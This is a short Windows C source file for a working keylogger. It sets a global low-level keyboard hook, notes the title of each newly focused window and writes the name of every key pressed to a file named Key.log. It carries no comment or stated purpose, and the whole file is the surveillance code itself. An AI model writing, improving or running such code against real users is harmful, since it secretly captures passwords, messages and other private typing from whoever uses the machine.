
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>


LRESULT CALLBACK MsgProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);


HANDLE g_hFile;
HWND g_hWActiveOld = 0, g_hWActiveNew;
//------------------Main
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)MsgProc, NULL,0);
    g_hFile = CreateFileW(L"Key.log", GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
    int a = GetLastError();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

//-----------------ProcWindow
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{

    return DefWindowProc(hwnd, uMsg, wParam, lParam);

}


LRESULT CALLBACK MsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT* KeyStruct = (KBDLLHOOKSTRUCT*)lParam;
    
    WCHAR namekey[65];
    WCHAR NameWindow[255];
    DWORD sizewrited = 0;
    int result;
    WCHAR EnterChar[2] = L"\n";
    switch (wParam)
    {
    case WM_KEYDOWN:
    {
        g_hWActiveNew = GetForegroundWindow();
        if (g_hWActiveNew != g_hWActiveOld)
        {
            ZeroMemory(NameWindow, sizeof(NameWindow));
            g_hWActiveOld = g_hWActiveNew;
            result = WriteFile(g_hFile, &EnterChar, sizeof(WCHAR) * (lstrlen(EnterChar)), &sizewrited, 0);
            GetWindowTextW(g_hWActiveNew, NameWindow, sizeof(NameWindow)/2);
            lstrcat(NameWindow, L":");
            result = WriteFile(g_hFile, &NameWindow, sizeof(WCHAR) * (lstrlen(NameWindow)), &sizewrited, 0);
        }
        ZeroMemory(namekey, sizeof(namekey));
        result = GetKeyNameTextW(KeyStruct->scanCode << 16, (LPWSTR)namekey, 65);
        lstrcat(namekey, L" ");
        result = WriteFile(g_hFile, &namekey,sizeof(WCHAR) * (lstrlen(namekey)), &sizewrited,0 );
        break;
    }
    default:
        break;
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}